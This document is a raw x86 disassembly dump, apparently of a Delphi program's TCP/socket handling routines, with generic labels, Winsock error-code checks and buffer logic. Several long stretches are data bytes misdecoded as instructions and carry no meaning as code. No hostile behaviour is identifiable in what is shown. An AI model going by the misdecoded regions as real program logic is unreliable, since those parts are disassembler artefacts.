mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47a588
push ebx
mov ebx eax
mov eax ebx
call sub_478a20
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_475d3c
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_475b0c
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_47a5c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a634
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_47591c
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a63b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47a644
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a6b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_475940
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a6bb
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47a6c4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_47a72c
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_421b4c
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_47a72c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d814
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_47a72c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4792e0
mov [ ebx + 0x70 ] eax
sub_47a754
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4789f0
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
lea eax [ esi + 0x70 ]
call sub_40d814
sub_47a798
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421d98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_47a7c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403910
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471cc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4219d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a81a
add [ eax ] eax
add [ eax ] al
in al dx
jae r-xdata
dec ecx
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_47a878
retn
add [ esi ] ah
test al 0x47
add [ ecx - 0x3ba743d ] cl
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_40416c
call sub_403b4c
mov eax [ ebp - 0x4 ]
call sub_4219d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a84c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47a871
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a878
retn
sub_47a888
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
test al 0x47
add [ eax ] ah
add [ eax ] al
add ah ah
insb
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esp + edi * 4 ] bh
inc ecx
add [ eax ] ch
mov ch 0x41
add al ah
mov esp 0xb58c0041
inc ecx
add al ah
mov ebx 0xbd980041
inc ecx
add [ eax ] bl
mov esp 0xb6b00041
inc ecx
add [ edi * 4 - 0x3dd3ffbf ] cl
inc edi
add al al
retn 0x47
sub_47ac11
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
dec edi
outsb
push edi
outsd
jb r-xdata
lodsb [ esi ]
inc edi
cmp al 0x50
inc edi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
push edi
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ 0x54644945 ] dl
inc ebx
push eax
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc eax
add al dl
xor al [ eax ]
or al 0x33
inc edx
imul ebp [ gs : bp - 0x64 ] 0x48004750
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebp + 0xc0047 ] gs
add [ eax ] al
je r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xad
inc edi
add [ eax + eax ] cl
je r-xdata
inc ebp
outsb
shr [ fs : edi + eax * 2 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ edi + eax * 2 + 0xc00 ] 0x0
inc eax
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
add [ eax ] al
je r-xdata
shl [ ebp * 4 + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp * 4 + 0xc0047 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] bl
inc ebp
dec ecx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x79 ] si
jo r-xdata
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
push 0x61746144
dec esi
xor eax 0x355c0040
inc eax
outsb
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
scasb [ edi ]
jb r-xdata
dec esi
outsd
je r-xdata
xor eax [ eax ]
sbb [ ebp + 0x49 ] al
jne r-xdata
lodsb [ fs : esi ]
inc edi
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
push esp
outsd
push edx
popad
push eax
scasb [ edi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x52 ] dl
dec ecx
outsb
inc edx
jne r-xdata
push 0x61746144
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
outsd
je r-xdata
inc eax
add ah dh
hlt
jo r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
dec esi
outsd
je r-xdata
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
scasb [ edi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0xc0047 ] ch
add [ eax ] al
je r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
lodsb [ esi ]
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc eax
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
lodsd [ esi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
lodsd [ esi ]
inc edi
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
jb r-xdata
aas
scasd [ edi ]
inc edi
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47af55
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_47af38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404118
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
mov eax eax
mov [ ebp + 0x47 ] gs
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47b25c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4043e0
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47af3f
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
sub_47af64
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47b09e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x30 ]
xor eax eax
push ebp
push sub_47b07c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_403b7c
jmp r-xdata
inc [ esi ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045d8
cmp [ eax ] 0x2e2e
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b0a5
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40413c
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_479f78
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404524
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub_47b0b3
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_47b180
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b187
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_475338
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_47b190
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_47b1b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478be0
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_478be0
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c1e4
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push sub_47c548
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c568
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47b25c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404118
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_47b29c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d814
lea eax [ esi + 0xa4 ]
call sub_40d814
lea eax [ esi + 0x80 ]
call sub_40d814
lea eax [ esi + 0x6c ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4752b8
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d814
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47b300
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_475338
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_475338
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d814
mov [ ebx + 0x70 ] 0x0
sub_47b358
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_47c3f0
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_47b380
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47b3d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b3d8
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47b3e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47b436
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4704e8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b43d
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_47b444
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
push 0x1
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x6c ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x48 ]
mov eax [ ebx + 0x74 ]
call sub_47c64c
mov edx edi
mov ecx esi
call sub_4028e8
mov edx esi
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_47b4b0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_47b748
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b74f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x10 ]
call sub_404118
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_41b578
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_471cc0
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_41b578
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41b514
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_41b758
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_471d74
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_47b75c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47b97a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_47c64c
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4748a0
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edx eax
add edx ebx
dec edx
